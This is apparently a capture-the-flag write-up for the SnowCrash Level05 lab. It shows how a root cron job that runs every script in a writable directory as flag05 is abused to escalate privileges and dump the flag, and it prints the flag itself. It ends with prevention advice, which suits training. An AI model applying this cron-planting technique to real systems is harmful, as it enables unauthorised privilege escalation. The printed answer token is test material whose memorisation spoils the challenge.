# Level05

## Flag

viuaaale9huek52boumoomioc

---

## Discovery

### Trying getflag

```
level05@SnowCrash:~$ getflag
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

Expected — without **flag05** privileges we cannot get the token.

### Checking the home directory contents

```
level05@SnowCrash:~$ ls
level05@SnowCrash:~$
```

The folder is empty — no binaries, scripts, or hints.

### Searching for files owned by level05

Result — nothing useful (everything is inside /proc).
So we immediately search for files owned by **flag05**.

### Searching for files owned by flag05

```
level05@SnowCrash:~$ find / -user "flag05" 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

Checking the file contents:

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

A few immediate observations:

* The script runs all files from `/opt/openarenaserver/*`.
* It runs them using bash — meaning we can put any code there.
* After execution, the file is deleted.

Therefore, if we can make this script run under **flag05**, we will obtain the required privileges.

---

## Use (Exploit)

### Trying to create a script in /opt/openarenaserver

```
level05@SnowCrash:~$ touch /opt/openarenaserver/script.sh
level05@SnowCrash:~$ vim /opt/openarenaserver/script.sh

#!/bin/bash
getflag
```

Trying to execute it:

```
level05@SnowCrash:~$ /opt/openarenaserver/script.sh
bash: /opt/openarenaserver/script.sh: Permission denied
```

Add permissions:

```
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/script.sh
level05@SnowCrash:~$ /opt/openarenaserver/script.sh
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```

That is correct — the script is executed **as level05**, not as flag05.

### Trying to run openarenaserver directly

```
level05@SnowCrash:~$ /usr/sbin/openarenaserver
bash: /usr/sbin/openarenaserver: Permission denied
```

Logical — the file belongs to flag05.

### Searching where this script may be executed automatically

Searching for references:

```
level05@SnowCrash:/$ grep -rnw '/var' -e 'openarenaserver' 2>/dev/null
/var/mail/level05:1:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
/var/spool/mail/level05:1:*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This looks like a cron job. Checking the file:

```
level05@SnowCrash:/$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

* */2 * * * * → runs every 2 minutes
* `su -c "..." - flag05` → executes the command as flag05
* `sh /usr/sbin/openarenaserver` → runs exactly **our script**

So any file we place inside `/opt/openarenaserver` will be executed within at most 2 minutes **as flag05**.

### Checking if cron is running

```
level05@SnowCrash:/$ ps -ef | grep cron
root      1502     1  0 16:00 ?        00:00:00 cron
```

Cron is running — perfect.

### Creating a useful script

Since we don't know where we have write permissions, let's save the flag to /tmp:

```
level05@SnowCrash:/$ vim /opt/openarenaserver/script.sh
```

Contents:

```
#!/bin/bash

touch /tmp/getflag
getflag > /tmp/getflag
```

After 2 minutes, check:

```
level05@SnowCrash:/$ cat tmp/getflag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

Done — we got the flag for user flag05.

---

## Prevention

To avoid such a vulnerability, one must:

* **Never execute files from a directory writable by another user**.
* Use strict permissions: `chmod 700 /opt/openarenaserver`.
* Verify the owner of each file before executing it.
* Avoid cron jobs running scripts as privileged users.
* Avoid constructs like `bash -x "$i"` — it directly executes user‑controlled code.

---

## Documentation

* man cron
* man crontab
* man su
* man bash
* man find
